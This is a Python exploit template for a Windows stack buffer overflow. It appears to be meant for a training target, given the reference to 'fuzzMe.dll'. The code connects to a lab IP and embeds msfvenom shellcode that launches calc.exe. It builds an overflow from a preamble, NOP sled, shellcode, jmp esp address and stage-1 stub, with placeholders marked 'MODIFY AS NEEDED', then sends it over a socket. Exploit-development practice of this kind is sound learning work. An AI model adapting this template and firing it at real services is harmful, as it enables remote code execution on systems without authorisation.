import socket
import time

# Connect to the target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.44.136",4567)) # MODIFY AS NEEDED
time.sleep(0.1)
s.recv(1024)

# msfvenom -p windows/exec cmd=calc.exe -f py -b "\x00\x0a\x0d"                                                                                                                                                                      2 ⨯
# Payload size: 220 bytes
# DO NOT MODIFY
buf =  b""
buf += b"\xd9\xe5\xba\x9e\xaf\xa2\xbb\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x31\x31\x53\x18\x83\xc3\x04\x03\x53\x8a\x4d"
buf += b"\x57\x47\x5a\x13\x98\xb8\x9a\x74\x10\x5d\xab\xb4\x46"
buf += b"\x15\x9b\x04\x0c\x7b\x17\xee\x40\x68\xac\x82\x4c\x9f"
buf += b"\x05\x28\xab\xae\x96\x01\x8f\xb1\x14\x58\xdc\x11\x25"
buf += b"\x93\x11\x53\x62\xce\xd8\x01\x3b\x84\x4f\xb6\x48\xd0"
buf += b"\x53\x3d\x02\xf4\xd3\xa2\xd2\xf7\xf2\x74\x69\xae\xd4"
buf += b"\x77\xbe\xda\x5c\x60\xa3\xe7\x17\x1b\x17\x93\xa9\xcd"
buf += b"\x66\x5c\x05\x30\x47\xaf\x57\x74\x6f\x50\x22\x8c\x8c"
buf += b"\xed\x35\x4b\xef\x29\xb3\x48\x57\xb9\x63\xb5\x66\x6e"
buf += b"\xf5\x3e\x64\xdb\x71\x18\x68\xda\x56\x12\x94\x57\x59"
buf += b"\xf5\x1d\x23\x7e\xd1\x46\xf7\x1f\x40\x22\x56\x1f\x92"
buf += b"\x8d\x07\x85\xd8\x23\x53\xb4\x82\x29\xa2\x4a\xb9\x1f"
buf += b"\xa4\x54\xc2\x0f\xcd\x65\x49\xc0\x8a\x79\x98\xa5\x65"
buf += b"\x30\x81\x8f\xed\x9d\x53\x92\x73\x1e\x8e\xd0\x8d\x9d"
buf += b"\x3b\xa8\x69\xbd\x49\xad\x36\x79\xa1\xdf\x27\xec\xc5"
buf += b"\x4c\x47\x25\xa6\x13\xdb\xa5\x07\xb6\x5b\x4f\x58"

# Offset found with fuzzer required to overwrite eip
eipOffset = 1024 # MODIFY AS NEEDED

# Location of a "jmp esp" found in fuzzMe.dll
jmpESP = b"\xFF\xFF\xFF\xFF" # MODIFY AS NEEDED

# Since we can control eip we will overwrite it with our
# "jmp esp" address. At the time eip gets executed esp points
# to the very next 4 bytes. We want to put some stage 1 code
# in here. Since eax points to the beginning of the message
# we sent we want to adjust this by a few bytes to get us to
# the beginning of the payload. We also need to adjust the
# stack pointer to be higher than this address so that we do
# not clobber our payload. Last we want to jump to our payload
# which will now be pointed to by eax.
stage1 = b"\xFF\xFF\xFF\xFF" # MODIFY AS NEEDED

# Preamble required by program to get us into vulnerable code
preamble =  b"PREAMBLE " # MODIFY AS NEEDED

# Critical character that gets us into vulnerable code
criticalChars = b"" # MODIFY AS NEEDED

# Front the payload with nops
nopsled = b"\x90"*(eipOffset-len(buf))

# Sometimes a minimum message size is required to trigger
minimumLength = 0 # MODIFY AS NEEDED

# Build exploit
exploit = preamble + nopsled + buf + jmpESP + stage1 + criticalChars # MODIFY AS NEEDED
if (minimumLength > 0):
    exploit += b"\x90"*(minimumLength-len(exploit))

# Send the payload
s.send(exploit)

# Close the connection
s.close()